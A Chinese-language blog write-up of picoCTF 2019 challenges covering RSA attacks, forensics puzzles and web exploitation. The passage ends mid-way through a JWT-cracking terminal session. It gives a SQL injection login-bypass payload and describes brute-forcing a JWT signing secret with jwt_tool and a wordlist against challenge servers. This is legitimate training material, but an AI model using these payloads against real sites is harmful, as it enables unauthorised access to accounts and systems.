title="Mr-Worldwide - Points: 200"></a>Mr-Worldwide - Points: 200</h2><blockquote><p>A musician left us a message. What’s it mean?</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)&#125;</span><br></pre></td></tr></table></figure><p>将坐标点对应google地图,得到一串城市坐标<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;</span><br><span class="line">2QH3+86 Kyoto, Japan</span><br><span class="line">FP9R+Q9 Odesa, Odessa Oblast, Ukraine</span><br><span class="line">QR55+H9 Dayton, Ohio, USA</span><br><span class="line">2X8H+3R Istanbul(Eminönü, Rüstem Paşa, Fatih/İstanbul, Turkey)</span><br><span class="line">F988+MM Abu Dhabi - United Arab Emirates</span><br><span class="line">4MRV+87 Kuala Lumpur, Federal Territory of Kuala Lumpur, Malaysia</span><br><span class="line">_</span><br><span class="line">2Q47+5C Addis Ababa, Ethiopia</span><br><span class="line">2Q6W+9H Loja, Ecuador</span><br><span class="line">9VHW+5R Amsterdam, Netherlands</span><br><span class="line">34PR+7J Sleepy Hollow, New York, USA</span><br><span class="line">QHRV+24 Kodiak, Alaska, USA</span><br><span class="line">6W4F+8R Alexandria, Egypt</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>提取每个城市名的首位字母,得到flag<br>picoCTF{KODIAK_ALASKA}</p><h2 id="rsa-pop-quiz-Points-200"><a href="#rsa-pop-quiz-Points-200" class="headerlink" title="rsa-pop-quiz - Points: 200"></a>rsa-pop-quiz - Points: 200</h2><blockquote><p>Class, take your seats! It’s PRIME-time for a quiz… nc 2019shell1.picoctf.com 61751<br>RSA <a href="https://simple.wikipedia.org/wiki/RSA_algorithm" target="_blank" rel="noopener">info</a></p></blockquote><p>nc过去后会出很多道关于rsa的题目</p><p>第一题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 60413</span><br><span class="line">p : 76753</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">n</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">n: 4636878989</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure><p>第二题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">p : 54269</span><br><span class="line">n : 5051846941</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">q</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">q: 93089</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure></p><p>第三题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">e : 3</span><br><span class="line">n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">q</span><br><span class="line">p</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):n</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure></p><p>第四题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 66347</span><br><span class="line">p : 12611</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">totient(n)</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">totient(n): 836623060</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure></p><p>第五题</p><blockquote><p>Using the formula: c=plaintext^e mod n.</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717</span><br><span class="line">e : 3</span><br><span class="line">n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">ciphertext</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">ciphertext: 256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure><p>第六题</p><blockquote><p>This operation cannot be performed because p and q are not there</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323</span><br><span class="line">e : 3</span><br><span class="line">n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">plaintext</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):n</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure><p>第七题</p><blockquote><p>For this we need to use the formula d=e^-1 mod ((p-1)(q-1)).Type (from Crypto.Util.number import *) in python.<br>Now type inverse(e,((p-1)(q-1))) by this you will get the mod.</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559</span><br><span class="line">p : 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637</span><br><span class="line">e : 65537</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">d</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">d: 1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure><p>第八题</p><blockquote><p>First find ‘q’, then find and then find ‘d’ using the formula:d=e^-1 mod toitent(n). After finding d use the formula m=cyphertext^d mod n or you can also use pow(cyphertext,d,n).</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433</span><br><span class="line">ciphertext : 3001133423508155019342391181454969453683740998389305521868482065953685989583037773702319581717484580966593370778920602258110457396723632087223210560766860657023257472172328220084386229851941678615818536289364033769762938914666434052719653085203028823631950908006150453932488069330802006070658787154818367594933024991778763357876382724018717890178006250599003585272226771381223645294365192346693302207328966906968620673419237444014642963102675933287390856161621142811266283239380789957372689818205738309791091491858305530388074249507780688913259911773093289575133704279048285836964311807507701403508531667913455534667</span><br><span class="line">e : 65537</span><br><span class="line">n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">plaintext</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">plaintext: 14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893</span><br><span class="line">Outstanding move!!!</span><br><span class="line">If you convert the last plaintext to a hex number, then ascii, you&apos;ll find what you need! ;)</span><br></pre></td></tr></table></figure><p>最后步骤<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.15+ (default, Oct  7 2019, 17:39:04) </span><br><span class="line">[GCC 7.4.0] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; hex(14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893)</span><br><span class="line"><span class="string">'0x7069636f4354467b7741385f74683474245f696c6c336147616c2e2e6f31383238643335377dL'</span></span><br><span class="line">&gt;&gt;&gt; <span class="string">'7069636f4354467b7741385f74683474245f696c6c336147616c2e2e6f31383238643335377d'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'picoCTF&#123;wA8_th4t$_ill3aGal..o1828d357&#125;'</span></span><br></pre></td></tr></table></figure></p><p><code>picoCTF{wA8_th4t$_ill3aGal..o1828d357}</code></p><h2 id="miniRSA-Points-300"><a href="#miniRSA-Points-300" class="headerlink" title="miniRSA - Points: 300"></a>miniRSA - Points: 300</h2><blockquote><p>Lets decrypt this: ciphertext? Something seems a bit small<br>Hints: RSA tutorial<a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/RSA_(cryptosystem)</a>)<br>How could having too small an e affect the security of this 2048 bit key?<br>Make sure you dont lose precision, the numbers are pretty big (besides the e value)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N: 29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673</span><br><span class="line">e: 3</span><br><span class="line"></span><br><span class="line">ciphertext (c): 2205316413931134031074603746928247799030155221252519872649604243394069216326314270624430181767863085854215545736160599718939066687544261205735290002239045830806570632200667142910415788763317978137702614731825117431700919216297401306846053</span><br></pre></td></tr></table></figure><p>e为3时最常见的指数是65537,直接调用gmpy2库解密<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.15+ (default, Oct  7 2019, 17:39:04) </span><br><span class="line">[GCC 7.4.0] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; import gmpy2</span><br><span class="line">&gt;&gt;&gt; from gmpy2 import mpz</span><br><span class="line">&gt;&gt;&gt; x=2205316413931134031074603746928247799030155221252519872649604243394069216326314270624430181767863085854215545736160599718939066687544261205735290002239045830806570632200667142910415788763317978137702614731825117431700919216297401306846053</span><br><span class="line">&gt;&gt;&gt; gmpy2.iroot(x,3)</span><br><span class="line">(mpz(13016382529449106065894479374027604750406953699090365388202785764091466430362237L), True)</span><br><span class="line">&gt;&gt;&gt; hex(13016382529449106065894479374027604750406953699090365388202785764091466430362237)</span><br><span class="line"><span class="string">'0x7069636f4354467b6e3333645f615f6c41726733725f655f31646365613061327dL'</span></span><br><span class="line">&gt;&gt;&gt; <span class="string">'7069636f4354467b6e3333645f615f6c41726733725f655f31646365613061327d'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'picoCTF&#123;n33d_a_lArg3r_e_1dcea0a2&#125;'</span></span><br></pre></td></tr></table></figure></p><p>picoCTF{n33d_a_lArg3r_e_1dcea0a2}</p><h2 id="b00tl3gRSA2-Points-400"><a href="#b00tl3gRSA2-Points-400" class="headerlink" title="b00tl3gRSA2 - Points: 400"></a>b00tl3gRSA2 - Points: 400</h2><blockquote><p>In RSA d is alot bigger than e, why dont we use d to encrypt instead of e? Connect with nc 2019shell1.picoctf.com 25894.<br>HInts: What is e generally?</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c: 2907769365419444727724175525671479981034192273204157726490522975279978593460225718961335784293417741607844791576565752988761172584273921395504823687108723176653809711169572251090119440733253837992509444186223539794384266837974042900938754540469801677256722806361322725611718921210360254805056231994475857991</span><br><span class="line">n: 104632934684607347040516088721842504035835154723230245213808635990738949032699364042811143172516764890701695806265159972897211958854001703738425521421300793289421837444580747279427459325350271662864746224966534428867373786235636261074057852584587383908394377990543646006651631195118177751615662277651780552659</span><br><span class="line">e: 55055344609365698084214364458001081971584593061566317896043105474840806238363136390928780096145202259654199584711655652614362225752191811521977900738394126069944440703568029472306324641124595496813413986093178525922575816469353968511903928979464226600653482605581664396016087501078623594868326395140317882593</span><br></pre></td></tr></table></figure><p>e很大容易造成维纳攻击,解题过程:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/CTF-RSA-tool<span class="comment"># touch rsa.txt</span></span><br><span class="line">/CTF-RSA-tool<span class="comment"># vi rsa.txt //按照格式把 n e c 写入</span></span><br><span class="line">/CTF-RSA-tool<span class="comment"># python solve.py -i rsa.txt</span></span><br><span class="line">INFO: picoCTF&#123;bad_1d3a5_3468581&#125;</span><br></pre></td></tr></table></figure></p><p>picoCTF{bad_1d3a5_3468581}</p><h1 id="杂项-Forensics"><a href="#杂项-Forensics" class="headerlink" title="杂项(Forensics)"></a>杂项(Forensics)</h1><h2 id="WhitePages-Points-250"><a href="#WhitePages-Points-250" class="headerlink" title="WhitePages - Points: 250"></a>WhitePages - Points: 250</h2><blockquote><p>I stopped using YellowPages and moved onto WhitePages… but the page they gave me is all blank!</p></blockquote><p>用sublime打开,替换里面的不明字符和空格成0和1,再进行转换</p><figure class="image-box">                <img src="./3.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{not_all_spaces_are_created_equal_f006c045f6b402ce4bc749dc7a262380}</p><h2 id="like1000-Points-250"><a href="#like1000-Points-250" class="headerlink" title="like1000 - Points: 250"></a>like1000 - Points: 250</h2><blockquote><p>This .tar file got tarred alot. Also available at /problems/like1000_0_369bbdba2af17750ddf10cc415672f1c.<br>Hints: Try and script this, it’ll save you alot of time</p></blockquote><p>要解压1000次,并把里面的内容写入一个文件,用脚本解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">  tf = tarfile.open(str(i)+<span class="string">".tar"</span>)</span><br><span class="line">  tf.extractall()</span><br></pre></td></tr></table></figure><p>得到最后一层的flag图片<br><figure class="image-box">                <img src="./4.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>picoCTF{l0t5_0f_TAR5}</p><h2 id="shark-on-wire-2-Points-300"><a href="#shark-on-wire-2-Points-300" class="headerlink" title="shark on wire 2 - Points: 300"></a>shark on wire 2 - Points: 300</h2><blockquote><p>We found this packet capture. Recover the flag that was pilfered from the network. You can also find the file in /problems/shark-on-wire-2_0_3e92bfbdb2f6d0e25b8d019453fdbf07.</p></blockquote><p>在观察这些流之后,发现有效负载从UDP流32开始,过滤源IP后可以看到类似的包,唯一改变的就是端口号,都减去5000后转为字符串就可以得到flag</p><figure class="image-box">                <img src="./5.png" alt="图片" title class>                <p>图片</p>            </figure><p>这里用的是大佬的bash脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">chr</span></span>() &#123;</span><br><span class="line">  <span class="built_in">printf</span> \\$(<span class="built_in">printf</span> <span class="string">'%03o'</span> <span class="variable">$1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> $(tshark -r ./capture.pcap -T fields -e udp.srcport -Y <span class="string">"ip.src == 10.0.0.66"</span>); <span class="keyword">do</span></span><br><span class="line">    chr $(( <span class="variable">$&#123;p&#125;</span> - 5000 ))</span><br><span class="line"><span class="keyword">done</span>; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure><p>picoCTF{p1LLf3r3d_data_v1a_st3g0}</p><h1 id="WEB应用-Web-Exploitation"><a href="#WEB应用-Web-Exploitation" class="headerlink" title="WEB应用(Web Exploitation)"></a>WEB应用(Web Exploitation)</h1><h2 id="Irish-Name-Repo-2-Points-350"><a href="#Irish-Name-Repo-2-Points-350" class="headerlink" title="Irish-Name-Repo 2 - Points: 350"></a>Irish-Name-Repo 2 - Points: 350</h2><blockquote><p>There is a website running at <a href="https://2019shell1.picoctf.com/problem/40968/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/40968/</a> (link). Someone has bypassed the login before, and now it’s being strengthened. Try to see if you can still login! or <a href="http://2019shell1.picoctf.com:40968" target="_blank" rel="noopener">http://2019shell1.picoctf.com:40968</a><br>Hints: The password is being filtered.</p></blockquote><p>左边的导航栏有 Admin login,进入管理员登陆页面,检查页面元素在password下面有个不显示的debug值,把debug值改成1,再进行sql注入</p><figure class="image-box">                <img src="./6.png" alt="图片" title class>                <p>图片</p>            </figure><p>发现反弹回来的是个sql注入查询语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL query: SELECT * FROM users WHERE name=&apos;&apos; AND password=&apos;&apos;</span><br></pre></td></tr></table></figure><p>payload: <code>?username=admin&#39;--&amp;password=1&amp;debug=1</code><br>返回的mysql查询语句是: <code>SELECT * FROM users WHERE name=&#39;admin&#39;--&#39; AND password=&#39;1&#39;</code></p><p>会把and后面的语句注释掉进行无密码登录</p><figure class="image-box">                <img src="./7.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{m0R3_SQL_plz_daf42601}</p><h2 id="Irish-Name-Repo-3-Points-400"><a href="#Irish-Name-Repo-3-Points-400" class="headerlink" title="Irish-Name-Repo 3 - Points: 400"></a>Irish-Name-Repo 3 - Points: 400</h2><blockquote><p>There is a secure website running at <a href="https://2019shell1.picoctf.com/problem/47247/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/47247/</a> (link) or <a href="http://2019shell1.picoctf.com:47247" target="_blank" rel="noopener">http://2019shell1.picoctf.com:47247</a>. Try to see if you can login as admin!<br>Hints: Seems like the password is encrypted.</p></blockquote><p>依旧是adminlogin页面,debug改为1,尝试admin登陆</p><figure class="image-box">                <img src="./8.png" alt="图片" title class>                <p>图片</p>            </figure><p>是个凯撒位移13位的加密,可以构造or查询语句</p><figure class="image-box">                <img src="./9.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{3v3n_m0r3_SQL_c2c37f5e}</p><h2 id="JaWT-Scratchpad-Points-400"><a href="#JaWT-Scratchpad-Points-400" class="headerlink" title="JaWT Scratchpad - Points: 400"></a>JaWT Scratchpad - Points: 400</h2><blockquote><p>Check the admin scratchpad! <a href="https://2019shell1.picoctf.com/problem/37903/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/37903/</a> or <a href="http://2019shell1.picoctf.com:37903" target="_blank" rel="noopener">http://2019shell1.picoctf.com:37903</a><br>Hints: What is that cookie?<br>Have you heard of JWT?</p></blockquote><p>我是第一次接触到JaWT和JWT,对于这道题是参考了Ch3lLIST4师傅的wp</p><p>简单了解下JWT(JSON Web Token)由三部分组成，分别是头信息、有效载荷、签名，中间以（.）分隔</p><p>header部分由令牌类型和散列算法组成 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload部分由claims构成,经过Base64Url编码，形成JWT的第二部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>签名令牌的信息虽然可以防止篡改,但任何人都可以读取(除非加密),所以不要将敏感信息放入到Payload或Header元素中,换言之我们就可以通过在cookie中写入令牌来进行伪身份访问<br>Signature部分需要用到编码的Header,编码的Payload,秘钥,Header中指定的算法,并对其进行签名,在经过base64-url编码后会形成由三个.结束的base64字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>我以Damya的用户名登陆jwt,在cookie里发现了名为jwt的签名令牌<br><figure class="image-box">                <img src="./10.png" alt="图片" title class>                <p>图片</p>            </figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiRGFteWEifQ.ciYsP6qbAYf8PrvRIJsJRAUoz_By7XQBUwipfyAJ0vU</span><br></pre></td></tr></table></figure><p>初步解码可以得到header和payload部分,于是使用jwttool工具爆剩下的信息,因为页面提示了john,可能是要使用john的字典…然后在师傅的页面看到是kali的rockyou.txt,我正好有就不下john了,太大了<br><figure class="image-box">                <img src="./11.png" alt="图片" title class>                <p>图片</p>            </figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">root@iZ2ze5rmf8lyj1geahh44hZ:~/jwt_tool<span class="comment"># python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiRGFteWEifQ.ciYsP6qbAYf8PrvRIJsJRAUoz_By7XQBUwipfyAJ0vU -d ~/wordlists/rockyou.txt</span></span><br><span class="line"></span><br><span 